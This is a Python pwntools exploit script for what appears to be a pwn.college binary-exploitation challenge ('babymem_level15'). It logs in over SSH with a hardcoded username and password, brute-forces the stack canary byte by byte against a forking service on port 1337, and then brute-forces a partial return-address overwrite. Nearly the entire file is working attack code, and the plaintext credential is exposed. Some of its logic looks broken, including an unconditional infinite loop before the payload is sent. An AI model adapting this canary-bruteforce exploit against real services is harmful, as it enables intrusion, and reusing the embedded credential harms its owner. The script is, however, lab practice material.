from pwn import *

# e = ELF('/babymem_level15_teaching1')
# libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")

master = s.process('/babymem_level15_teaching1')

context.log_level = 0

master.recv()


canary = b'\x00'

while len(canary) < 8:
    for i in range(256):
        print(i)
        while 1:
            p = remote('localhost', 1337)
            master.recv(1, timeout=1)
            p.close()

        pay = b'A' * 0x78 + canary + bytes([i])
        p.sendlineafter(b'size: ',b'4096')
        p.sendafter(b'bytes)!\n',pay)

        master.recvuntil(b"Let's try it now!\n\n")
        x = master.recv()
        if b'*** stack smashing detected ***: terminated' not in x:
            canary += bytes([i])
            print(canary)
            break
        print(x)
        p.close()

    print(x)
    print(canary)
    p.close()

RET = b'\x9E'

while len(RET) < 6:
    for i in range(16):
        if i == 0x10:continue
        # if len(RET) == 1: i = (i << 4) | 15
        print(i)
        # p = s.process(['nc','localhost','1337'])
        p = remote('localhost', 1337)
        
        # pid = p.pid
        pay = b'A' * 0x78 + canary + p64(0) + RET + bytes([(i<<4)+0xA])

        p.send(pay)

        x = p.recvuntil(b'Goodbye!\n')
        print(x)
        try:
            x = p.recv()
            print(x)
            break
        except:
            pass
        p.close()

    p.close()

    print(RET[::-1].hex())
    print(RET)